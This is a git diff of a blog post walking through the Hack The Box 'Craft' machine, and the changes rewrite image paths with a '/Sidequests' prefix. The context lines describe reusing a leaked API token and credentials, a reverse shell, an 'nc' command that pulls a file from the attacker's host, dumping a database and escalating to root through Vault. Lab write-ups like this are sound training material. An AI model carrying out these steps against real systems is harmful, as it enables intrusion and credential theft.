@@ -8,7 +8,7 @@ toc_sticky: false
 toc_label: "Table of Awesome Content"
 toc_icon: "cog"
 ---
-<img class="alignnone size-full wp-image-402" src="/assets/uploads/2019/12/craft_logo.jpg" alt="" width="300" height="300" srcset="/assets/uploads/2019/12/craft_logo.jpg 300w, /assets/uploads/2019/12/craft_logo-150x150.jpg 150w" sizes="(max-width: 300px) 100vw, 300px" />
+<img class="alignnone size-full wp-image-402" src="/Sidequests/Sidequests/assets/uploads/2019/12/craft_logo.jpg" alt="" width="300" height="300" srcset="/Sidequests/assets/uploads/2019/12/craft_logo.jpg 300w, /Sidequests/assets/uploads/2019/12/craft_logo-150x150.jpg 150w" sizes="(max-width: 300px) 100vw, 300px" />
 
 ## Recon and Scans
 
@@ -65,22 +65,22 @@ The ports 22, 443, and 6022 are useful though, and the output shows some info ab
 ### SSH
 
 Connecting to the SSH on port 22 shows this:  
-<img class="alignnone size-full wp-image-408" src="/assets/uploads/2019/12/2019-12-03_18h01_06.png" alt="" width="802" height="457" srcset="/assets/uploads/2019/12/2019-12-03_18h01_06.png 802w, /assets/uploads/2019/12/2019-12-03_18h01_06-300x171.png 300w, /assets/uploads/2019/12/2019-12-03_18h01_06-768x438.png 768w" sizes="(max-width: 802px) 100vw, 802px" />  
+<img class="alignnone size-full wp-image-408" src="/Sidequests/assets/uploads/2019/12/2019-12-03_18h01_06.png" alt="" width="802" height="457" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_18h01_06.png 802w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h01_06-300x171.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h01_06-768x438.png 768w" sizes="(max-width: 802px) 100vw, 802px" />  
 Gotta love ASCII art! Feel free to try some passwords if you want, I did 😉.
 
 The SSH on port 6022 was less interesting though:  
-<img class="alignnone size-full wp-image-410" src="/assets/uploads/2019/12/2019-12-03_18h08_13.png" alt="" width="803" height="66" srcset="/assets/uploads/2019/12/2019-12-03_18h08_13.png 803w, /assets/uploads/2019/12/2019-12-03_18h08_13-300x25.png 300w, /assets/uploads/2019/12/2019-12-03_18h08_13-768x63.png 768w" sizes="(max-width: 803px) 100vw, 803px" /> 
+<img class="alignnone size-full wp-image-410" src="/Sidequests/assets/uploads/2019/12/2019-12-03_18h08_13.png" alt="" width="803" height="66" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_18h08_13.png 803w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h08_13-300x25.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h08_13-768x63.png 768w" sizes="(max-width: 803px) 100vw, 803px" /> 
 
 ### About Page
 
 Looking at the HTTPS page lets us know some things about the target, and some of the technologies to be exploring:  
-[<img class="alignnone wp-image-411 size-large" src="/assets/uploads/2019/12/2019-12-03_18h10_27-1024x700.png" alt="" width="640" height="438" srcset="/assets/uploads/2019/12/2019-12-03_18h10_27-1024x700.png 1024w, /assets/uploads/2019/12/2019-12-03_18h10_27-300x205.png 300w, /assets/uploads/2019/12/2019-12-03_18h10_27-768x525.png 768w, /assets/uploads/2019/12/2019-12-03_18h10_27-1536x1050.png 1536w, /assets/uploads/2019/12/2019-12-03_18h10_27.png 1544w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_18h10_27.png)  
+[<img class="alignnone wp-image-411 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-03_18h10_27-1024x700.png" alt="" width="640" height="438" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_18h10_27-1024x700.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h10_27-300x205.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h10_27-768x525.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h10_27-1536x1050.png 1536w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h10_27.png 1544w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-03_18h10_27.png)  
 If you hover over the links that are outlined here, you&#8217;ll see some hostnames to save and explore.
 
 Apparently, the target is a craft beer brewery, hence the name craft. They seem to be developing a listing of brews and a public REST API to access it.
 
 Links &#8220;https://api.craft.htb/api/&#8221; and &#8220;https://gogs.craft.htb/&#8221; are listed and you should save the hostnames &#8220;api.craft.htb&#8221; and &#8220;gogs.craft.htb&#8221; into your HOSTS file. It should have lines like this:  
-<img class="alignnone size-full wp-image-413" src="/assets/uploads/2019/12/2019-12-03_18h19_20.png" alt="" width="802" height="247" srcset="/assets/uploads/2019/12/2019-12-03_18h19_20.png 802w, /assets/uploads/2019/12/2019-12-03_18h19_20-300x92.png 300w, /assets/uploads/2019/12/2019-12-03_18h19_20-768x237.png 768w" sizes="(max-width: 802px) 100vw, 802px" />  
+<img class="alignnone size-full wp-image-413" src="/Sidequests/assets/uploads/2019/12/2019-12-03_18h19_20.png" alt="" width="802" height="247" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_18h19_20.png 802w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h19_20-300x92.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h19_20-768x237.png 768w" sizes="(max-width: 802px) 100vw, 802px" />  
 If you don&#8217;t add these lines to your HOSTS file, you won&#8217;t be able to browse those pages, since the site is apparently using Virtual Hosts to direct traffic depending on the hostname you&#8217;re visiting.
 
 That&#8217;s really all there is to the About page, next look at the &#8216;api.craft.htb&#8217; page.
@@ -89,18 +89,18 @@ That&#8217;s really all there is to the About page, next look at the &#8216;api.
 
 This page breaks down the usage of their application REST API. There are functions to generate and test authentication tokens. And there are functions to work with their list of brews.
 
-[<img class="alignnone wp-image-418 size-large" src="/assets/uploads/2019/12/2019-12-03_18h31_01-1024x743.png" alt="" width="640" height="464" srcset="/assets/uploads/2019/12/2019-12-03_18h31_01-1024x743.png 1024w, /assets/uploads/2019/12/2019-12-03_18h31_01-300x218.png 300w, /assets/uploads/2019/12/2019-12-03_18h31_01-768x557.png 768w, /assets/uploads/2019/12/2019-12-03_18h31_01.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_18h31_01.png)  
+[<img class="alignnone wp-image-418 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-03_18h31_01-1024x743.png" alt="" width="640" height="464" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_18h31_01-1024x743.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h31_01-300x218.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h31_01-768x557.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h31_01.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-03_18h31_01.png)  
 It could be useful to inspect these functions.
 
 ### Gogs Host
 
 This is a locally hosted source code repository that has lots of interesting nuggets of hackery in it!
 
-[<img class="alignnone wp-image-419 size-large" src="/assets/uploads/2019/12/2019-12-03_18h43_50-1024x743.png" alt="" width="640" height="464" srcset="/assets/uploads/2019/12/2019-12-03_18h43_50-1024x743.png 1024w, /assets/uploads/2019/12/2019-12-03_18h43_50-300x218.png 300w, /assets/uploads/2019/12/2019-12-03_18h43_50-768x557.png 768w, /assets/uploads/2019/12/2019-12-03_18h43_50.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_18h43_50.png)  
+[<img class="alignnone wp-image-419 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-03_18h43_50-1024x743.png" alt="" width="640" height="464" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_18h43_50-1024x743.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h43_50-300x218.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h43_50-768x557.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h43_50.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-03_18h43_50.png)  
 Definitely explore all of this site, it&#8217;s where most of the action happens.
 
 On one of the Issue pages, you will see a couple of things worth noting:  
-[<img class="alignnone wp-image-421 size-large" src="/assets/uploads/2019/12/2019-12-03_18h58_42-1024x743.png" alt="" width="640" height="464" srcset="/assets/uploads/2019/12/2019-12-03_18h58_42-1024x743.png 1024w, /assets/uploads/2019/12/2019-12-03_18h58_42-300x218.png 300w, /assets/uploads/2019/12/2019-12-03_18h58_42-768x557.png 768w, /assets/uploads/2019/12/2019-12-03_18h58_42.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_18h58_42.png)
+[<img class="alignnone wp-image-421 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-03_18h58_42-1024x743.png" alt="" width="640" height="464" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_18h58_42-1024x743.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h58_42-300x218.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h58_42-768x557.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-03_18h58_42.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-03_18h58_42.png)
 
 An auth token is left in the source within an example of how to interact with the API through Curl. Both of those points are useful to save in your notes for later.
 
@@ -109,10 +109,10 @@ curl -H 'X-Craft-API-Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidXN
 {% endhighlight %}
 
 Another noteworthy point is how they are talking about something awful happening with a particular patch. Take a look at the patch and save the code for later inspection.  
-[<img class="alignnone wp-image-422 size-large" src="/assets/uploads/2019/12/2019-12-03_19h08_49-1024x743.png" alt="" width="640" height="464" srcset="/assets/uploads/2019/12/2019-12-03_19h08_49-1024x743.png 1024w, /assets/uploads/2019/12/2019-12-03_19h08_49-300x218.png 300w, /assets/uploads/2019/12/2019-12-03_19h08_49-768x557.png 768w, /assets/uploads/2019/12/2019-12-03_19h08_49.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_19h08_49.png)
+[<img class="alignnone wp-image-422 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-03_19h08_49-1024x743.png" alt="" width="640" height="464" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_19h08_49-1024x743.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-03_19h08_49-300x218.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_19h08_49-768x557.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-03_19h08_49.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-03_19h08_49.png)
 
 When looking through the commit history, one of them you&#8217;ll be happy to see for sure&#8230;  
-[<img class="alignnone wp-image-428 size-large" src="/assets/uploads/2019/12/2019-12-03_19h17_58-1024x743.png" alt="" width="640" height="464" srcset="/assets/uploads/2019/12/2019-12-03_19h17_58-1024x743.png 1024w, /assets/uploads/2019/12/2019-12-03_19h17_58-300x218.png 300w, /assets/uploads/2019/12/2019-12-03_19h17_58-768x557.png 768w, /assets/uploads/2019/12/2019-12-03_19h17_58.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_19h17_58.png)
+[<img class="alignnone wp-image-428 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-03_19h17_58-1024x743.png" alt="" width="640" height="464" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_19h17_58-1024x743.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-03_19h17_58-300x218.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_19h17_58-768x557.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-03_19h17_58.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-03_19h17_58.png)
 
 Credentials! Which is your first way to get in deeper&#8230;
 
@@ -133,19 +133,19 @@ It&#8217;s a JWT token, which is put together in three sections.
   3. the hash signature
 
 Decode each section of the token at a time with &#8216;base64 -d&#8217;.  
-<img class="alignnone size-full wp-image-434" src="/assets/uploads/2019/12/2019-12-03_20h15_01.png" alt="" width="801" height="114" srcset="/assets/uploads/2019/12/2019-12-03_20h15_01.png 801w, /assets/uploads/2019/12/2019-12-03_20h15_01-300x43.png 300w, /assets/uploads/2019/12/2019-12-03_20h15_01-768x109.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
+<img class="alignnone size-full wp-image-434" src="/Sidequests/assets/uploads/2019/12/2019-12-03_20h15_01.png" alt="" width="801" height="114" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_20h15_01.png 801w, /Sidequests/assets/uploads/2019/12/2019-12-03_20h15_01-300x43.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_20h15_01-768x109.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
 
 This example token just has a generic username &#8216;user&#8217; in it, which is probably bogus. If you use a site like [epochconverter.com](https://www.epochconverter.com/) to decode the expiration date, it shows that token expired in February 2019.
 
 To create a token that works, we&#8217;ll have to get the API site to send it to us. Send the credentials for dinesh to the login page and it will return a valid token.  
-[<img class="alignnone wp-image-436 size-large" src="/assets/uploads/2019/12/2019-12-03_20h35_27-1024x743.png" alt="" width="640" height="464" srcset="/assets/uploads/2019/12/2019-12-03_20h35_27-1024x743.png 1024w, /assets/uploads/2019/12/2019-12-03_20h35_27-300x218.png 300w, /assets/uploads/2019/12/2019-12-03_20h35_27-768x557.png 768w, /assets/uploads/2019/12/2019-12-03_20h35_27.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-03_20h35_27.png)
+[<img class="alignnone wp-image-436 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-03_20h35_27-1024x743.png" alt="" width="640" height="464" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_20h35_27-1024x743.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-03_20h35_27-300x218.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_20h35_27-768x557.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-03_20h35_27.png 1454w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-03_20h35_27.png)
 
 Decode the token and see what it&#8217;s auth data is. For me, the expiration time was only about 5 minutes ahead.
 
 Using the Curl request found in the source as an example, craft a request to the server. You could start by sending a request to the &#8216;api.craft.htb/api/auth/check&#8217; page, or send a brew to add to the list like in the example.
 
 Since you&#8217;ll have to get a new token every 5 minutes, it may be best to separate the token out from the curl request like this:  
-<img class="alignnone size-full wp-image-439" src="/assets/uploads/2019/12/2019-12-03_21h48_22.png" alt="" width="801" height="157" srcset="/assets/uploads/2019/12/2019-12-03_21h48_22.png 801w, /assets/uploads/2019/12/2019-12-03_21h48_22-300x59.png 300w, /assets/uploads/2019/12/2019-12-03_21h48_22-768x151.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
+<img class="alignnone size-full wp-image-439" src="/Sidequests/assets/uploads/2019/12/2019-12-03_21h48_22.png" alt="" width="801" height="157" srcset="/Sidequests/assets/uploads/2019/12/2019-12-03_21h48_22.png 801w, /Sidequests/assets/uploads/2019/12/2019-12-03_21h48_22-300x59.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-03_21h48_22-768x151.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
 
 Now you can experiment with sending things to the brew list and looking at sections of the brew list with the other API functions.
 
@@ -276,36 +276,36 @@ Once your shellcode works and you have a reverse connection, start poking around
 Along with the Craft application files, you&#8217;ll probably see files dropped by other hackers if you&#8217;re on the free network like me. If you want to take some shortcuts you can get clues from what other hackers are leaving behind, but that would make a boring writeup, so I&#8217;m not going to.
 
 Most of the files you find are the same that you saw on the Gogs repo. But you&#8217;ll find one file here that couldn&#8217;t be found elsewhere:  
-<img class="alignnone size-full wp-image-462" src="/assets/uploads/2019/12/2019-12-05_18h29_00.png" alt="" width="802" height="600" srcset="/assets/uploads/2019/12/2019-12-05_18h29_00.png 802w, /assets/uploads/2019/12/2019-12-05_18h29_00-300x224.png 300w, /assets/uploads/2019/12/2019-12-05_18h29_00-768x575.png 768w" sizes="(max-width: 802px) 100vw, 802px" /> 
+<img class="alignnone size-full wp-image-462" src="/Sidequests/assets/uploads/2019/12/2019-12-05_18h29_00.png" alt="" width="802" height="600" srcset="/Sidequests/assets/uploads/2019/12/2019-12-05_18h29_00.png 802w, /Sidequests/assets/uploads/2019/12/2019-12-05_18h29_00-300x224.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-05_18h29_00-768x575.png 768w" sizes="(max-width: 802px) 100vw, 802px" /> 
 
 Great! Credentials for the database. It&#8217;s always a good idea to try credentials found on other login places you came across before. In this case the SSH services and the Gogs service. But unfortunately, looking for a place to use these creds directly is a rabbit hole. Instead, use what you&#8217;re given to query the database with your shell.
 
 ### SQL Dumping
 
 Turns out Python3 is accessible within this jail, and you have test scripts also. Namely, &#8220;dbtest.py&#8221;. Use &#8216;cat&#8217; to dump its contents and look for ways to use it to your ends.  
-<img class="alignnone size-full wp-image-463" src="/assets/uploads/2019/12/2019-12-05_18h34_04.png" alt="" width="802" height="530" srcset="/assets/uploads/2019/12/2019-12-05_18h34_04.png 802w, /assets/uploads/2019/12/2019-12-05_18h34_04-300x198.png 300w, /assets/uploads/2019/12/2019-12-05_18h34_04-768x508.png 768w" sizes="(max-width: 802px) 100vw, 802px" /> 
+<img class="alignnone size-full wp-image-463" src="/Sidequests/assets/uploads/2019/12/2019-12-05_18h34_04.png" alt="" width="802" height="530" srcset="/Sidequests/assets/uploads/2019/12/2019-12-05_18h34_04.png 802w, /Sidequests/assets/uploads/2019/12/2019-12-05_18h34_04-300x198.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-05_18h34_04-768x508.png 768w" sizes="(max-width: 802px) 100vw, 802px" /> 
 
 Well, that&#8217;s easy enough. Just copy this test script to a new file (if you&#8217;re on a free server, to let other hackers have to work for it too), and make some modifications to get more info out of the database.
 
 But&#8230; there&#8217;s no editor available that&#8217;ll work within this limited shell. Bummer. You can edit a file locally on your own box and copy it over with this shell though. I&#8217;m sure there are multiple ways to do that, including using &#8220;wget&#8221;, and &#8220;nc&#8221;. I chose to go with Netcat.
 
 Start with copying and pasting the original &#8220;dbtest.py&#8221; code into a file of your own, then modify the SELECT statement.  
-<img class="alignnone size-full wp-image-467" src="/assets/uploads/2019/12/2019-12-05_19h04_01.png" alt="" width="801" height="573" srcset="/assets/uploads/2019/12/2019-12-05_19h04_01.png 801w, /assets/uploads/2019/12/2019-12-05_19h04_01-300x215.png 300w, /assets/uploads/2019/12/2019-12-05_19h04_01-768x549.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
+<img class="alignnone size-full wp-image-467" src="/Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01.png" alt="" width="801" height="573" srcset="/Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01.png 801w, /Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01-300x215.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01-768x549.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
 
 It&#8217;s best to get an overview of the database instead of just guessing table names. Dump out &#8220;information_schema.tables&#8221; to get that from MySQL.
 
 To get the file over to the remote system, set up a Netcat listener that feeds in your newly created file&#8230; like this:  
-<img class="alignnone size-full wp-image-466" src="/assets/uploads/2019/12/2019-12-05_18h48_05.png" alt="" width="801" height="117" srcset="/assets/uploads/2019/12/2019-12-05_18h48_05.png 801w, /assets/uploads/2019/12/2019-12-05_18h48_05-300x44.png 300w, /assets/uploads/2019/12/2019-12-05_18h48_05-768x112.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
+<img class="alignnone size-full wp-image-466" src="/Sidequests/assets/uploads/2019/12/2019-12-05_18h48_05.png" alt="" width="801" height="117" srcset="/Sidequests/assets/uploads/2019/12/2019-12-05_18h48_05.png 801w, /Sidequests/assets/uploads/2019/12/2019-12-05_18h48_05-300x44.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-05_18h48_05-768x112.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
 
 To finish getting the file transferred, go back into your reverse shell and connect back again to your new listener with `nc 10.10.15.130 6666 > nop.py` .
 
 The initial shell will become unusable after establishing this new connection. To fix that, use a &#8220;-w 3&#8221; switch on one of the Netcat commands to get it to timeout after 3 seconds. After the 3 seconds, you&#8217;ll be able to use the limited shell again without starting another one. Otherwise, just disconnect the reverse shell and re-establish it.
 
-<img class="alignnone size-full wp-image-468" src="/assets/uploads/2019/12/2019-12-05_19h05_19.png" alt="" width="802" height="246" srcset="/assets/uploads/2019/12/2019-12-05_19h05_19.png 802w, /assets/uploads/2019/12/2019-12-05_19h05_19-300x92.png 300w, /assets/uploads/2019/12/2019-12-05_19h05_19-768x236.png 768w" sizes="(max-width: 802px) 100vw, 802px" /> 
+<img class="alignnone size-full wp-image-468" src="/Sidequests/assets/uploads/2019/12/2019-12-05_19h05_19.png" alt="" width="802" height="246" srcset="/Sidequests/assets/uploads/2019/12/2019-12-05_19h05_19.png 802w, /Sidequests/assets/uploads/2019/12/2019-12-05_19h05_19-300x92.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-05_19h05_19-768x236.png 768w" sizes="(max-width: 802px) 100vw, 802px" /> 
 
 Awesome, we have results printed out! But it seems kind of short, there should be several generic database tables as well as what was made for the application.
 
-<img class="alignnone size-full wp-image-470" src="/assets/uploads/2019/12/2019-12-05_19h04_01-1.png" alt="" width="801" height="573" srcset="/assets/uploads/2019/12/2019-12-05_19h04_01-1.png 801w, /assets/uploads/2019/12/2019-12-05_19h04_01-1-300x215.png 300w, /assets/uploads/2019/12/2019-12-05_19h04_01-1-768x549.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
+<img class="alignnone size-full wp-image-470" src="/Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01-1.png" alt="" width="801" height="573" srcset="/Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01-1.png 801w, /Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01-1-300x215.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-05_19h04_01-1-768x549.png 768w" sizes="(max-width: 801px) 100vw, 801px" /> 
 
 The fetchone() call is responsible for the limited results. Instead, use a similar function called fetchall(). Once you get all of the results, it should look like this when it&#8217;s cleaned up:
 
@@ -397,7 +397,7 @@ You should find out that Gilfoyle does!
 
 Once you log into the Gogs service with Gilfoyle&#8217;s credentials, you&#8217;ll see he has a private repository that you can now explore.
 
-[<img class="alignnone wp-image-475 size-large" src="/assets/uploads/2019/12/2019-12-09_12h54_31-1024x670.png" alt="" width="640" height="419" srcset="/assets/uploads/2019/12/2019-12-09_12h54_31-1024x670.png 1024w, /assets/uploads/2019/12/2019-12-09_12h54_31-300x196.png 300w, /assets/uploads/2019/12/2019-12-09_12h54_31-768x502.png 768w, /assets/uploads/2019/12/2019-12-09_12h54_31.png 1147w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-09_12h54_31.png)
+[<img class="alignnone wp-image-475 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-09_12h54_31-1024x670.png" alt="" width="640" height="419" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_12h54_31-1024x670.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-09_12h54_31-300x196.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-09_12h54_31-768x502.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-09_12h54_31.png 1147w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-09_12h54_31.png)
 
 You should immediately see that there&#8217;s a folder &#8220;.ssh&#8221; and inside it actually has an SSH private key. That&#8217;s got to be used for something good.
 
@@ -409,22 +409,22 @@ From the [documentation](https://hub.docker.com/_/vault/): Vault is a tool for s
 
 Googling the line of code &#8220;vault secrets enable ssh&#8221; from the &#8220;secrets.sh&#8221; script, you&#8217;ll come to a [documentation page](https://www.vaultproject.io/docs/secrets/ssh/index.html) explaining ways to use SSH authentication with Vault. After reading the manual, you should be able to tell that this script is setting up a [One Time SSH Password](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html) to log into the root account. So running this script is probably a way to escalate to the root account _after_ we get in some other way first.
 
-[<img class="alignnone wp-image-477 size-large" src="/assets/uploads/2019/12/2019-12-09_12h58_33-1024x662.png" alt="" width="640" height="414" srcset="/assets/uploads/2019/12/2019-12-09_12h58_33-1024x662.png 1024w, /assets/uploads/2019/12/2019-12-09_12h58_33-300x194.png 300w, /assets/uploads/2019/12/2019-12-09_12h58_33-768x497.png 768w, /assets/uploads/2019/12/2019-12-09_12h58_33.png 1161w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-09_12h58_33.png)
+[<img class="alignnone wp-image-477 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-09_12h58_33-1024x662.png" alt="" width="640" height="414" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_12h58_33-1024x662.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-09_12h58_33-300x194.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-09_12h58_33-768x497.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-09_12h58_33.png 1161w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-09_12h58_33.png)
 
 ### SSH
 
-[<img class="alignnone wp-image-478 size-large" src="/assets/uploads/2019/12/2019-12-09_14h18_58-1024x662.png" alt="" width="640" height="414" srcset="/assets/uploads/2019/12/2019-12-09_14h18_58-1024x662.png 1024w, /assets/uploads/2019/12/2019-12-09_14h18_58-300x194.png 300w, /assets/uploads/2019/12/2019-12-09_14h18_58-768x496.png 768w, /assets/uploads/2019/12/2019-12-09_14h18_58.png 1162w" sizes="(max-width: 640px) 100vw, 640px" />](/assets/uploads/2019/12/2019-12-09_14h18_58.png)
+[<img class="alignnone wp-image-478 size-large" src="/Sidequests/assets/uploads/2019/12/2019-12-09_14h18_58-1024x662.png" alt="" width="640" height="414" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_14h18_58-1024x662.png 1024w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h18_58-300x194.png 300w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h18_58-768x496.png 768w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h18_58.png 1162w" sizes="(max-width: 640px) 100vw, 640px" />](/Sidequests/assets/uploads/2019/12/2019-12-09_14h18_58.png)
 
 Use this key to log into one of the SSH services that was discovered early in the challenge. Copy the keys into your own &#8220;.ssh&#8221; folder. I named mine specifically for this challenge, but you can leave the default names as they are.
 
-<img class="alignnone size-full wp-image-479" src="/assets/uploads/2019/12/2019-12-09_14h23_49.png" alt="" width="722" height="57" srcset="/assets/uploads/2019/12/2019-12-09_14h23_49.png 722w, /assets/uploads/2019/12/2019-12-09_14h23_49-300x24.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
+<img class="alignnone size-full wp-image-479" src="/Sidequests/assets/uploads/2019/12/2019-12-09_14h23_49.png" alt="" width="722" height="57" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_14h23_49.png 722w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h23_49-300x24.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 After you have the keys saved to your box, make sure the agent is running by issuing the command `ssh-agent` and then add the key with `ssh-add` like this:  
-<img class="alignnone size-full wp-image-480" src="/assets/uploads/2019/12/2019-12-09_14h27_19.png" alt="" width="722" height="110" srcset="/assets/uploads/2019/12/2019-12-09_14h27_19.png 722w, /assets/uploads/2019/12/2019-12-09_14h27_19-300x46.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
+<img class="alignnone size-full wp-image-480" src="/Sidequests/assets/uploads/2019/12/2019-12-09_14h27_19.png" alt="" width="722" height="110" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_14h27_19.png 722w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h27_19-300x46.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
 
 You will be prompted for a passphrase to use the private key, but good for us that Gilfoyle reuses passwords! Just copy and paste in the previously found password and you&#8217;re in!
 
-<img class="alignnone size-full wp-image-481" src="/assets/uploads/2019/12/2019-12-09_14h31_17.png" alt="" width="721" height="524" srcset="/assets/uploads/2019/12/2019-12-09_14h31_17.png 721w, /assets/uploads/2019/12/2019-12-09_14h31_17-300x218.png 300w" sizes="(max-width: 721px) 100vw, 721px" /> 
+<img class="alignnone size-full wp-image-481" src="/Sidequests/assets/uploads/2019/12/2019-12-09_14h31_17.png" alt="" width="721" height="524" srcset="/Sidequests/assets/uploads/2019/12/2019-12-09_14h31_17.png 721w, /Sidequests/assets/uploads/2019/12/2019-12-09_14h31_17-300x218.png 300w" sizes="(max-width: 721px) 100vw, 721px" /> 
 
 ## Get USER, onto ROOT
 
@@ -434,10 +434,10 @@ Getting root is super easy since we already saw the way in. From the [vault docu
 
 And then you&#8217;ll be able to use the One Time Password for access to root on the vault.
 
-<img class="alignnone size-full wp-image-482" src="/assets/uploads/2019/12/2019-12-09_14h37_32.png" alt="" width="722" height="436" srcset="/assets/uploads/2019/12/2019-12-09_14h37_32.png 722w, /assets/uploads/2019/12/2019-12-09_14h37_32-300x181.png 300w" sizes="(max-width: 722px) 100vw, 722px" /> 
